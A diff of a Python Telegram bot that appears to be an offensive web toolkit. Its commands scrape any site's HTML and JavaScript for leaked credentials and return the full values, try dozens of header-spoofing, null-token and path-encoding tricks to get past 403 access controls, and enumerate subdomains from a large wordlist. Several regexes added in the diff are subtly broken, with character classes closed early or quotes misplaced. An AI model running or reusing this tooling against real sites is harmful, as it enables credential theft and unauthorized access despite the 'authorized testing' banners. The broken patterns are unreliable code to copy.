-    "MongoDB URI":            (r'mongodb(?:\+srv)?://[^\s"\x27<>]{10,}',                  "🔴"),
-    "MySQL DSN":              (r'mysql://[^\s"\x27<>]{10,}',                               "🔴"),
-    "PostgreSQL DSN":         (r'postgres(?:ql)?://[^\s"\x27<>]{10,}',                    "🔴"),
-    "Redis URI":              (r'redis://[^\s"\x27<>:]+:[^\s"\x27<>@]+@[^\s"\x27<>]+',        "🔴"),
-    "Elasticsearch":          (r'https?://[^:]+:[^@]+@[^\s"\x27<>]*:9200',               "🔴"),
-    "ClickHouse DSN":         (r'clickhouse://[^\s"\x27<>]{10,}',                         "🔴"),
-    "Cassandra Host":         (r'(?i)cassandra.{0,20}host["\s:=]+["\x27][0-9.]+["\x27]',   "🟡"),
+    # ── Database ──────────────────────────────────
+    "MongoDB URI":            (r'mongodb(?:\+srv)?://[^\\s"\x27]<>]{10,}',                  "🔴"),
+    "MySQL DSN":              (r'mysql://[^\\s"\x27]<>]{10,}',                               "🔴"),
+    "PostgreSQL DSN":         (r'postgres(?:ql)?://[^\\s"\x27]<>]{10,}',                    "🔴"),
+    "Redis URI":              (r'redis://[^\\s"\x27]<>:]+:[^\\s"\x27]<>@]+@[^\\s"\x27]<>]+',        "🔴"),
+    "Elasticsearch":          (r'https?://[^:]+:[^@]+@[^\\s"\x27]<>]*:9200',               "🔴"),
+    "ClickHouse DSN":         (r'clickhouse://[^\\s"\x27]<>]{10,}',                         "🔴"),
+    "Cassandra Host":         (r'(?i)cassandra.{0,20}host["\s:=]+["\x27"][0-9.]+["\x27"]',   "🟡"),
     "S3 Bucket URL":          (r'https://[a-z0-9\-\.]+\.s3(?:[\.\-][a-z0-9\-]+)?\.amazonaws\.com', "🟡"),
-    # -- Secrets / Security ------------------------
+    # ── Secrets / Security ────────────────────────
     "HashiCorp Vault Token":  (r'hvs\.[a-zA-Z0-9_\-]{24,}',                           "🔴"),
-    "Vault Generic Token":    (r'(?i)vault.{0,20}token["\s:=]+["\x27][a-zA-Z0-9_\-\.]{24,}["\x27]', "🔴"),
-    "Generic Password":       (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\x27][^"\x27]{8,}["\x27]', "🟠"),
-    "Secret Key":             (r'(?i)secret[_-]?key["\s:=]+["\x27][a-zA-Z0-9!@#$%^&*_\-]{16,}["\x27]', "🟠"),
-    "API Key Generic":        (r'(?i)api[_-]?key["\s:=]+["\x27][a-zA-Z0-9_\-]{16,}["\x27]', "🟡"),
-    "Access Key Generic":     (r'(?i)access[_-]?key["\s:=]+["\x27][a-zA-Z0-9_\-]{16,}["\x27]', "🟡"),
+    "Vault Generic Token":    (r'(?i)vault.{0,20}token["\s:=]+["\x27"][a-zA-Z0-9_\-\.]{24,}["\x27"]', "🔴"),
+    "Generic Password":       (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\x27"][^"\x27]{8,}["\x27"]', "🟠"),
+    "Secret Key":             (r'(?i)secret[_-]?key["\s:=]+["\x27"][a-zA-Z0-9!@#$%^&*_\-]{16,}["\x27"]', "🟠"),
+    "API Key Generic":        (r'(?i)api[_-]?key["\s:=]+["\x27"][a-zA-Z0-9_\-]{16,}["\x27"]', "🟡"),
+    "Access Key Generic":     (r'(?i)access[_-]?key["\s:=]+["\x27"][a-zA-Z0-9_\-]{16,}["\x27"]', "🟡"),
     "Internal IP Leak":       (r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', "🟡"),
-    # -- Maps / Geo --------------------------------
+    # ── Maps / Geo ────────────────────────────────
     "Google Maps Key":        (r'AIza[0-9A-Za-z_-]{35}',                               "🟠"),
     "Mapbox Token":           (r'pk\.[a-zA-Z0-9]{60,}\.[a-zA-Z0-9_\-]{22,}',          "🟠"),
-    "HERE Maps Key":          (r'(?i)here.{0,10}apikey["\s:=]+["\x27][a-zA-Z0-9_\-]{40}["\x27]', "🟠"),
-    # -- Misc SaaS --------------------------------
+    "HERE Maps Key":          (r'(?i)here.{0,10}apikey["\s:=]+["\x27"][a-zA-Z0-9_\-]{40}["\x27"]', "🟠"),
+    # ── Misc SaaS ────────────────────────────────
     "Zendesk Token":          (r'(?i)zendesk.{0,20}[a-zA-Z0-9_\-]{40,}',              "🟠"),
     "Shopify Token":          (r'shpat_[a-fA-F0-9]{32}',                               "🔴"),
     "Shopify Shared Secret":  (r'shpss_[a-fA-F0-9]{32}',                               "🔴"),
@@ -6790,20 +6871,20 @@ _SECRET_PATTERNS = {
     "Datadog API Key":        (r'(?i)datadog.{0,20}[0-9a-f]{32}',                      "🔴"),
     "New Relic Key":          (r'NRAK-[A-Z0-9]{27}',                                   "🔴"),
     "Sentry DSN":             (r'https://[0-9a-f]{32}@[a-z0-9.]+\.sentry\.io/\d+',    "🟠"),
-    # -- V24: Additional SaaS / Dev tools ------------------------------
+    # ── V24: Additional SaaS / Dev tools ──────────────────────────────
     "Notion API Token":       (r'secret_[a-zA-Z0-9]{43}',                              "🔴"),
     "Airtable API Key":       (r'(?i)airtable.{0,20}[a-zA-Z0-9]{17}',                 "🟠"),
     "Linear API Key":         (r'lin_api_[a-zA-Z0-9]{40}',                             "🔴"),
     "Doppler Token":          (r'dp\.pt\.[a-zA-Z0-9]{40,}',                            "🔴"),
     "Infisical Token":        (r'infisical:[a-zA-Z0-9_\-]{40,}',                       "🔴"),
     "PyPI Token":             (r'pypi-[A-Za-z0-9_\-]{100,}',                           "🔴"),
-    "Terraform Cloud Token":  (r'(?i)terraform.{0,20}token["\s:=]+["\x27][a-zA-Z0-9_\-\.]{20,}["\x27]', "🔴"),
+    "Terraform Cloud Token":  (r'(?i)terraform.{0,20}token["\s:=]+["\x27"][a-zA-Z0-9_\-\.]{20,}["\x27"]', "🔴"),
     "Pulumi Token":           (r'pul-[a-zA-Z0-9]{40}',                                 "🔴"),
     "Okta API Token":         (r'(?i)okta.{0,20}[a-zA-Z0-9_-]{40}',                   "🔴"),
-    "Auth0 Client Secret":    (r'(?i)auth0.{0,20}client.{0,10}secret["\s:=]+["\x27][a-zA-Z0-9_\-]{40,}["\x27]', "🔴"),
+    "Auth0 Client Secret":    (r'(?i)auth0.{0,20}client.{0,10}secret["\s:=]+["\x27"][a-zA-Z0-9_\-]{40,}["\x27"]', "🔴"),
     "Twitch Client Secret":   (r'(?i)twitch.{0,20}[a-zA-Z0-9_]{30}',                  "🟠"),
     "Twitter Bearer":         (r'AAAAAAAAAAAAAAAAAAAAA[a-zA-Z0-9%]+',                  "🟠"),
-    "Instagram Token":        (r'(?i)instagram.{0,20}access.{0,10}token["\s:=]+["\x27][a-zA-Z0-9_\-\.]{40,}["\x27]', "🟠"),
+    "Instagram Token":        (r'(?i)instagram.{0,20}access.{0,10}token["\s:=]+["\x27"][a-zA-Z0-9_\-\.]{40,}["\x27"]', "🟠"),
     "Zoom JWT Secret":        (r'(?i)zoom.{0,20}[a-zA-Z0-9_\-]{40}',                  "🟠"),
     "Asana PAT":              (r'0\/[0-9]{16}:[a-zA-Z0-9]{32}',                        "🔴"),
     "Monday.com Token":       (r'(?i)monday.{0,20}[a-zA-Z0-9_\-]{40,}',               "🟠"),
@@ -6812,15 +6893,15 @@ _SECRET_PATTERNS = {
     "Elastic APM":            (r'(?i)elastic.{0,20}apm.{0,20}[a-zA-Z0-9_\-]{40}',    "🔴"),
     "Grafana API Key":        (r'(?i)grafana.{0,20}[a-zA-Z0-9_\-]{40}',               "🔴"),
     "GitBook Token":          (r'(?i)gitbook.{0,20}[a-zA-Z0-9_\-]{40}',               "🟠"),
-    "Webhook Secret":         (r'(?i)webhook[_-]?secret["\s:=]+["\x27][a-zA-Z0-9_\-]{20,}["\x27]', "🟠"),
-    "Encryption Key Generic": (r'(?i)(?:aes|encrypt|cipher)[_-]?key["\s:=]+["\x27][a-zA-Z0-9/+=]{16,}["\x27]', "🔴"),
-    "HMAC Secret":            (r'(?i)hmac[_-]?secret["\s:=]+["\x27][a-zA-Z0-9_\-]{20,}["\x27]', "🟠"),
-    "Database Password":      (r'(?i)db[_-]?pass(?:word)?["\s:=]+["\x27][^"\x27]{8,}["\x27]', "🟠"),
-    "JWT Secret":             (r'(?i)jwt[_-]?secret["\s:=]+["\x27][a-zA-Z0-9_\-!@#$%^&*]{16,}["\x27]', "🔴"),
+    "Webhook Secret":         (r'(?i)webhook[_-]?secret["\s:=]+["\x27"][a-zA-Z0-9_\-]{20,}["\x27"]', "🟠"),
+    "Encryption Key Generic": (r'(?i)(?:aes|encrypt|cipher)[_-]?key["\s:=]+["\x27"][a-zA-Z0-9/+=]{16,}["\x27"]', "🔴"),
+    "HMAC Secret":            (r'(?i)hmac[_-]?secret["\s:=]+["\x27"][a-zA-Z0-9_\-]{20,}["\x27"]', "🟠"),
+    "Database Password":      (r'(?i)db[_-]?pass(?:word)?["\s:=]+["\x27"][^"\x27]{8,}["\x27"]', "🟠"),
+    "JWT Secret":             (r'(?i)jwt[_-]?secret["\s:=]+["\x27"][a-zA-Z0-9_\-!@#$%^&*]{16,}["\x27"]', "🔴"),
 }
 
 async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/extract <url> - Scan HTML + JS for secrets, always exports ZIP with all sources"""
+    """/extract <url> — Scan HTML + JS for secrets, always exports ZIP with all sources"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/extract https://example.com`\n\n"
@@ -6829,11 +6910,11 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "private keys, MongoDB URIs, passwords & more.\n\n"
             f"Checks `{len(_SECRET_PATTERNS)}` secret patterns across all JS bundles.\n\n"
             "📦 *Always exports a ZIP* containing:\n"
-            "  • `index.html`   raw HTML source\n"
-            "  • `js/` folder   all external JS files\n"
-            "  • `inline_scripts/`   all inline `<script>` blocks\n"
-            "  • `report.json`   full findings report\n"
-            "  • `report.txt`   human-readable summary\n\n"
+            "  • `index.html` — raw HTML source\n"
+            "  • `js/` folder — all external JS files\n"
+            "  • `inline_scripts/` — all inline `<script>` blocks\n"
+            "  • `report.json` — full findings report\n"
+            "  • `report.txt` — human-readable summary\n\n"
             "⚠️ _For authorized security research only._",
             parse_mode='Markdown'
         )
@@ -6859,7 +6940,7 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
     domain = urlparse(url).hostname
 
     msg = await update.effective_message.reply_text(
-        f"🔑 *Secret Scan   `{domain}`*\n\n"
+        f"🔑 *Secret Scan — `{domain}`*\n\n"
         f"⬇️ Phase 1: Fetching HTML source\n"
         f"📦 Phase 2: Downloading JS bundles\n"
         f"🔍 Phase 3: `{len(_SECRET_PATTERNS)}` pattern matching\n"
@@ -6874,7 +6955,7 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
         resp = session.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
         soup = BeautifulSoup(resp.text, 'html.parser')
 
-        # -- Build source map ------------------------------
+        # ── Build source map ──────────────────────────────
         # sources = { filename_in_zip : content_str }
         sources        = {}
         source_origins = {}   # filename → original URL or tag info
@@ -6915,7 +6996,7 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 source_origins[fname] = f"<script> tag #{inline_idx} on {url}"
                 inline_idx += 1
 
-        # -- Scan all sources ------------------------------
+        # ── Scan all sources ──────────────────────────────
         findings  = []
         seen_keys = set()
 
@@ -6953,7 +7034,7 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`", parse_mode='Markdown')
         return
 
-    # -- Sort findings by risk ----------------------------
+    # ── Sort findings by risk ────────────────────────────
     risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
     findings.sort(key=lambda x: risk_order.get(x["risk"], 9))
 
@@ -6961,10 +7042,10 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
     high     = sum(1 for f in findings if f["risk"] == "🟠")
     med      = sum(1 for f in findings if f["risk"] == "🟡")
 
-    # -- Build report.txt (human readable, full values) --
+    # ── Build report.txt (human readable, full values) ──
     txt_lines = [
         "=" * 60,
-        f"  EXTRACT REPORT   {domain}",
+        f"  EXTRACT REPORT — {domain}",
         f"  Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
         f"  URL: {url}",
         "=" * 60,
@@ -7008,7 +7089,7 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     report_txt = "\n".join(txt_lines)
 
-    # -- Build report.json --------------------------------
+    # ── Build report.json ────────────────────────────────
     report_json = json.dumps({
         "domain":          domain,
         "url":             url,
@@ -7028,7 +7109,7 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "files": {fname: source_origins[fname] for fname in sources},
     }, ensure_ascii=False, indent=2)
 
-    # -- Build ZIP in memory ------------------------------
+    # ── Build ZIP in memory ──────────────────────────────
     await msg.edit_text(
         f"🗜️ Building ZIP for `{domain}`...\n"
         f"📂 `{len(sources)}` source files + reports",
@@ -7052,14 +7133,14 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _js_count     = sum(1 for f in sources if f.startswith("js/"))
         _inline_count = sum(1 for f in sources if f.startswith("inline_scripts/"))
         readme = (
-            f"EXTRACT SCAN   {domain}\n"
+            f"EXTRACT SCAN — {domain}\n"
             f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
             f"CONTENTS\n"
-            f"  sources/index.html             Raw HTML page\n"
-            f"  sources/js/                    External JS files ({_js_count} files)\n"
-            f"  sources/inline_scripts/        Inline <script> blocks ({_inline_count} blocks)\n"
-            f"  report.txt                     Human-readable findings (FULL values)\n"
-            f"  report.json                    Machine-readable JSON report\n\n"
+            f"  sources/index.html           — Raw HTML page\n"
+            f"  sources/js/                  — External JS files ({_js_count} files)\n"
+            f"  sources/inline_scripts/      — Inline <script> blocks ({_inline_count} blocks)\n"
+            f"  report.txt                   — Human-readable findings (FULL values)\n"
+            f"  report.json                  — Machine-readable JSON report\n\n"
             f"FINDINGS: {len(findings)} total  "
             f"(Critical:{critical} High:{high} Medium:{med})\n"
         )
@@ -7068,10 +7149,10 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
     zip_buffer.seek(0)
     zip_size_mb = zip_buffer.getbuffer().nbytes / 1024 / 1024
 
-    # -- Send Telegram summary (redacted) ----------------
+    # ── Send Telegram summary (redacted) ────────────────
     if findings:
         tg_lines = [
-            f"🚨 *{len(findings)} Secret(s) Found   `{domain}`*",
+            f"🚨 *{len(findings)} Secret(s) Found — `{domain}`*",
             f"🔴 Critical: `{critical}` | 🟠 High: `{high}` | 🟡 Medium: `{med}`",
             f"📂 Scanned: `{len(sources)}` files\n",
         ]
@@ -7082,7 +7163,7 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"   File:  `{f['file']}`  Line `{f['line']}`"
             )
         if len(findings) > 15:
-            tg_lines.append(f"\n_…and {len(findings)-15} more   see ZIP report_")
+            tg_lines.append(f"\n_…and {len(findings)-15} more — see ZIP report_")
         tg_lines.append("\n⚠️ _Telegram: values redacted. Full values in ZIP report._")
     else:
         tg_lines = [
@@ -7102,14 +7183,14 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as _e:
         logging.debug("Scan error: %s", _e)
 
-    # -- Send ZIP -----------------------------------------
+    # ── Send ZIP ─────────────────────────────────────────
     cap = (
-        f"📦 *Extract ZIP   `{domain}`*\n"
+        f"📦 *Extract ZIP — `{domain}`*\n"
         f"🔍 `{len(sources)}` source files | `{len(findings)}` findings\n"
         f"🔴`{critical}` 🟠`{high}` 🟡`{med}` | 💾 `{zip_size_mb:.2f} MB`\n\n"
-        f"📄 `report.txt`   full unredacted values\n"
-        f"📋 `report.json`   machine-readable\n"
-        f"📁 `sources/`   raw HTML + JS files"
+        f"📄 `report.txt` — full unredacted values\n"
+        f"📋 `report.json` — machine-readable\n"
+        f"📁 `sources/` — raw HTML + JS files"
     )
     try:
         await context.bot.send_document(
@@ -7126,31 +7207,62 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
-# ==================================================
-# 🔓  /bypass403   403 Forbidden Bypass Tester
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔓  /bypass403 — 403 Forbidden Bypass Tester
+# ══════════════════════════════════════════════════
 
 _BYPASS_HEADERS = [
+    # IP spoofing — internal
     {"X-Original-URL":             "{path}"},
     {"X-Rewrite-URL":              "{path}"},
     {"X-Custom-IP-Authorization":  "127.0.0.1"},
     {"X-Forwarded-For":            "127.0.0.1"},
     {"X-Forwarded-For":            "localhost"},
+    {"X-Forwarded-For":            "0.0.0.0"},
+    {"X-Forwarded-For":            "::1"},
+    {"X-Forwarded-For":            "192.168.1.1"},
     {"X-Remote-IP":                "127.0.0.1"},
     {"X-Remote-Addr":              "127.0.0.1"},
     {"X-Host":                     "localhost"},
     {"X-Real-IP":                  "127.0.0.1"},
     {"X-ProxyUser-Ip":             "127.0.0.1"},
-    {"Referer":                    "{url}"},
     {"X-Originating-IP":           "127.0.0.1"},
     {"True-Client-IP":             "127.0.0.1"},
     {"Client-IP":                  "127.0.0.1"},
     {"CF-Connecting-IP":           "127.0.0.1"},
     {"Forwarded":                  "for=127.0.0.1"},
+    {"Forwarded":                  "for=\"[::1]\""},
+    {"X-Cluster-Client-IP":        "127.0.0.1"},
+    {"X-Real-Ip":                  "127.0.0.1"},
+    {"X-Client-IP":                "127.0.0.1"},
+    {"X-Backend-Server":           "localhost"},
+    # Auth bypass
+    {"Authorization":              "Bearer null"},
+    {"Authorization":              "Bearer undefined"},
+    {"Authorization":              "Bearer admin"},
+    {"Authorization":              "null"},
+    {"X-Auth-Token":               "null"},
+    {"X-Access-Token":             "null"},
+    # Header tricks
+    {"Referer":                    "{url}"},
     {"X-Frame-Options":            "Allow"},
     {"X-WAF-Bypass":               "1"},
     {"X-Bypass":                   "1"},
-    {"Authorization":              "Bearer null"},
+    {"X-Sucuri-Bypass":            "1"},
+    {"X-Akamai-Bypass":            "1"},
+    # Content-type tricks
+    {"Content-Type":               "application/json"},
+    {"Content-Type":               "text/html"},
+    # Admin IP tricks
+    {"X-Admin":                    "1"},
+    {"X-Internal":                 "true"},
+    {"X-Debug":                    "1"},
+    {"X-Dev":                      "true"},
+    {"X-Override":                 "1"},
+    # Cache tricks
+    {"Cache-Control":              "no-cache"},
+    {"Pragma":                     "no-cache"},
+    {"X-Cache-Bypass":             "1"},
 ]
 
 _BYPASS_PATH_VARIANTS = [
@@ -7169,6 +7281,17 @@ _BYPASS_PATH_VARIANTS = [
     "/{path_upper}",
     "/{path_lower}",
     "{path_dot_slash}",
+    # v46: more bypass variants
+    "/{path_no_slash}%23",      # URL-encoded #
+    "/{path_no_slash}%3f",      # URL-encoded ?
+    "/{path_no_slash}%2f",      # URL-encoded /
+    "/{path_no_slash}%252f",    # double-encoded /
+    "/{path_no_slash}/.;/",     # Spring path traversal
+    "/{path_no_slash};jsessionid=x",  # Java session bypass
+    "/{path_no_slash}%0a",      # CRLF
+    "/{path_no_slash}.json",    # extension trick
+    "/{path_no_slash}.xml",
+    "/{path_no_slash}.html",
 ]
 
 _BYPASS_METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
@@ -7207,7 +7330,7 @@ def _bypass_sync(url: str) -> list:
         except Exception:
             return None
 
-    # -- Baseline: confirm it's actually 403 --------
+    # ── Baseline: confirm it's actually 403 ────────
     baseline = _probe(url, label="baseline")
     if not baseline:
         return []
@@ -7228,7 +7351,7 @@ def _bypass_sync(url: str) -> list:
                 return True
         return False
 
-    # -- Header manipulation --------------------------
+    # ── Header manipulation ──────────────────────────
     for hdr_template in _BYPASS_HEADERS:
         hdrs = {}
         for k, v in hdr_template.items():
@@ -7239,7 +7362,7 @@ def _bypass_sync(url: str) -> list:
             r["technique"] = "header_manipulation"
             results.append(r)
 
-    # -- Path variants --------------------------------
+    # ── Path variants ────────────────────────────────
     path_variants = [
         (f"{base}{path}/",                    "path/"),
         (f"{base}{path}//",                   "path//"),
@@ -7266,14 +7389,14 @@ def _bypass_sync(url: str) -> list:
             r["technique"] = "path_variant"
             results.append(r)
 
-    # -- HTTP method override -------------------------
+    # ── HTTP method override ─────────────────────────
     for method in _BYPASS_METHODS:
         r = _probe(url, method=method, label=f"Method: {method}")
         if r:
             r["technique"] = "method_override"
             results.append(r)
 
-    # -- Method override via header -------------------
+    # ── Method override via header ───────────────────
     for method in ["GET", "POST", "PUT", "DELETE"]:
         r = _probe(url,
                    extra_headers={"X-HTTP-Method-Override": method,
@@ -7283,7 +7406,7 @@ def _bypass_sync(url: str) -> list:
             r["technique"] = "method_override_header"
             results.append(r)
 
-    # -- Content-Type tricks --------------------------
+    # ── Content-Type tricks ──────────────────────────
     for ct in ["application/json", "text/xml", "application/x-www-form-urlencoded"]:
         r = _probe(url, extra_headers={"Content-Type": ct, "Content-Length": "0"},
                    method="POST", label=f"POST Content-Type: {ct}")
@@ -7299,7 +7422,7 @@ def _bypass_sync(url: str) -> list:
 
 
 async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/bypass403 <url> - Test 403 Forbidden bypass techniques"""
+    """/bypass403 <url> — Test 403 Forbidden bypass techniques"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/bypass403 https://example.com/admin`\n\n"
@@ -7322,7 +7445,7 @@ async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "403 Bypass")
@@ -7344,7 +7467,7 @@ async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
     path   = urlparse(url).path or "/"
 
     msg = await update.effective_message.reply_text(
-        f"⣾ *Bypass Testing   `{domain}`*\n"
+        f"⣾ *Bypass Testing — `{domain}`*\n"
         f"Path: `{path}`\n\n"
         f"_Running 50+ bypass techniques..._",
         parse_mode='Markdown'
@@ -7362,13 +7485,13 @@ async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
     tested      = len(results) - 1   # exclude baseline
 
     lines = [
-        f"🔓 *Bypass Results   `{path}`*",
+        f"🔓 *Bypass Results — `{path}`*",
         f"🌐 `{domain}` | Baseline: `{baseline_st}`",
         f"🧪 Tested: `{tested}` techniques | ✅ Bypassed: `{len(bypasses)}`\n",
     ]
 
     if not bypasses:
-        lines.append("🔒 No bypasses found   endpoint is well-protected.")
+        lines.append("🔒 No bypasses found — endpoint is well-protected.")
     else:
         lines.append(f"*🚨 {len(bypasses)} Bypass(es) Found:*")
         for b in bypasses[:15]:
@@ -7381,7 +7504,7 @@ async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if loc:
                     lines.append(f"      → `{loc[:60]}`")
 
-    # -- Summary by technique type --------------------
+    # ── Summary by technique type ────────────────────
     tech_counts = {}
     for b in bypasses:
         t = b.get("technique", "other")
@@ -7393,7 +7516,7 @@ async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     lines.append("\n⚠️ _Authorized testing only._")
 
-    # -- Export JSON if bypasses found ----------------
+    # ── Export JSON if bypasses found ────────────────
     if bypasses:
         import io
         report = json.dumps({
@@ -7418,7 +7541,7 @@ async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 chat_id=update.effective_chat.id,
                 document=buf,
                 filename=f"bypass403_{domain}_{ts}.json",
-                caption=f"🔓 Bypass report   `{domain}`   `{len(bypasses)}` bypasses",
+                caption=f"🔓 Bypass report — `{domain}` — `{len(bypasses)}` bypasses",
                 parse_mode='Markdown'
             )
         except Exception:
@@ -7428,85 +7551,85 @@ async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _active_scans.pop(uid, None)   # fix: release scan slot
 
 
-# ==================================================
-# 📡  /subdomains   Advanced Subdomain Enumerator
-# ==================================================
+# ══════════════════════════════════════════════════
+# 📡  /subdomains — Advanced Subdomain Enumerator
+# ══════════════════════════════════════════════════
 
 _SUBDOMAIN_WORDLIST = [
-    # -- Common / Generic --------------------------
+    # ── Common / Generic ──────────────────────────
     "www","www2","www3","web","web1","web2","web3","site","sites","home",
-    # -- Mail --------------------------------------
+    # ── Mail ──────────────────────────────────────
     "mail","mail2","smtp","pop","pop3","imap","mx","mx1","mx2","mx3",
     "webmail","email","exchange","autodiscover","autoconfig","relay",
-    # -- FTP / File --------------------------------
+    # ── FTP / File ────────────────────────────────
     "ftp","sftp","files","uploads","upload","download","downloads","media",
     "static","assets","cdn","cdn2","cdn3","images","img","imgs","pics",
     "video","videos","audio","docs","documents","resources","res",
-    # -- Remote / Network --------------------------
+    # ── Remote / Network ──────────────────────────
     "vpn","vpn2","remote","rdp","ssh","gateway","proxy","firewall",
     "router","switch","lb","loadbalancer","haproxy","nginx","apache",
-    # -- API / Services ----------------------------
+    # ── API / Services ────────────────────────────
     "api","api2","api3","api4","apis","rest","graphql","grpc","ws","wss",
     "service","services","svc","microservice","backend","server","app",
-    # -- Development -------------------------------
+    # ── Development ───────────────────────────────
     "dev","dev2","dev3","develop","development","devops","sandbox","lab",
     "labs","test","test2","test3","testing","uat","qa","qa2","qas","rc",
     "staging","stage","stage2","stg","stg2","beta","beta2","alpha","preview",
     "demo","demo2","old","legacy","v1","v2","v3","v4","new","next","canary",
-    # -- Admin / Management ------------------------
+    # ── Admin / Management ────────────────────────
     "admin","admin2","administrator","panel","portal","dashboard","manage",
     "manager","control","cpanel","whm","plesk","directadmin","webadmin",
-    # -- Auth / Identity ---------------------------
+    # ── Auth / Identity ───────────────────────────
     "login","auth","auth2","sso","oauth","id","identity","idp","saml",
     "account","accounts","user","users","profile","password","reset",
-    # -- Databases ---------------------------------
+    # ── Databases ─────────────────────────────────
     "db","db1","db2","db3","database","mysql","postgres","postgresql","mssql",
     "oracle","redis","mongo","mongodb","elasticsearch","elastic","memcache",
     "cache","cassandra","clickhouse","influx","influxdb","timeseries",
-    # -- DevOps / CI-CD ----------------------------
+    # ── DevOps / CI-CD ────────────────────────────
     "ci","cd","build","deploy","jenkins","jenkins2","gitlab","github",
     "bitbucket","gitea","gogs","drone","travis","circleci","teamcity",
     "sonar","sonarqube","nexus","artifactory","registry","docker","harbor",
     "k8s","kubernetes","rancher","portainer","nomad","consul","vault",
-    # -- Monitoring / Observability ----------------
+    # ── Monitoring / Observability ────────────────
     "monitor","monitoring","status","grafana","prometheus","kibana",
     "elastic","logstash","fluentd","zabbix","nagios","datadog","newrelic",
     "sentry","jaeger","zipkin","alertmanager","pagerduty","ops","opsgenie",
-    # -- Communication / Collaboration ------------
+    # ── Communication / Collaboration ────────────
     "chat","slack","teams","meet","conference","jitsi","zoom","webex",
     "forum","forums","community","board","helpdesk","support","ticket",
     "tickets","jira","confluence","wiki","kb","docs2","notion","redmine",
-    # -- Cloud / Infrastructure --------------------
+    # ── Cloud / Infrastructure ────────────────────
     "aws","azure","gcp","cloud","cloud2","heroku","netlify","vercel",
     "s3","bucket","storage","backup","backup2","archive","dr","disaster",
     "infra","infrastructure","internal","intranet","corp","corporate",
     "private","secure","ssl","tls","hq","office","dc","datacenter",
-    # -- DNS / Network -----------------------------
+    # ── DNS / Network ─────────────────────────────
     "ns","ns1","ns2","ns3","ns4","dns","dns1","dns2","rdns","ntp","time",
     "node","node1","node2","host","host1","host2","server1","server2",
-    # -- E-commerce / Business ---------------------
+    # ── E-commerce / Business ─────────────────────
     "shop","store","cart","checkout","payment","pay","billing","invoice",
     "orders","shipping","logistics","erp","crm","pos","inventory",
     "affiliate","partner","partners","reseller","wholesale","b2b","b2c",
-    # -- Content / Marketing -----------------------
+    # ── Content / Marketing ───────────────────────
     "blog","news","press","media2","content","cms","wp","wordpress","ghost",
     "assets2","static2","events","calendar","jobs","careers","hiring",
     "about","contact","info","landing","marketing","promo","campaign",
-    # -- Regional / Geographic ---------------------
+    # ── Regional / Geographic ─────────────────────
     "us","us1","us2","eu","eu1","eu2","asia","uk","au","jp","de","fr",
     "ca","in","br","sg","kr","cn","ru","nl","ch","se","no","fi","dk",
     "prod","production","live","global","int","external","ext",
-    # -- Security / Scan ---------------------------
+    # ── Security / Scan ───────────────────────────
     "scan","pentest","security","sec","waf","ids","ips","siem","cert",
     "bug","vuln","disclosure","abuse","noc","soc","csirt","ir",
-    # -- Misc common -------------------------------
+    # ── Misc common ───────────────────────────────
     "app","apps","mobile","m","wap","pwa","ios","android","native",
     "analytics","stats","data","report","reporting","bi","insight",
     "notifications","push","webhook","hooks","events2","stream","streaming",
     "broadcast","live2","feed","feeds","rss","atom","sitemap",
     "error","errors","exception","log","logs","logging","trace","debug",
     "health","ping","check","heartbeat","probe","uptime","availability",
-    # -- Uncommon but valid ------------------------
+    # ── Uncommon but valid ────────────────────────
     "sandbox2","mock","mocks","stub","fixture","load","loadtest","perf",
     "bench","benchmark","chaos","canary2","feature","flag","flags","edge",
     "origin","origin2","direct","bypass","raw","internal2","private2",
@@ -7526,15 +7649,54 @@ _SUBDOMAIN_WORDLIST = [
     "form","forms","survey","poll","quiz","vote","review","rating",
     "invoice2","quote","contract","legal","tos","privacy","gdpr",
     "notify","notification","sms","otp","verify","verification","2fa",
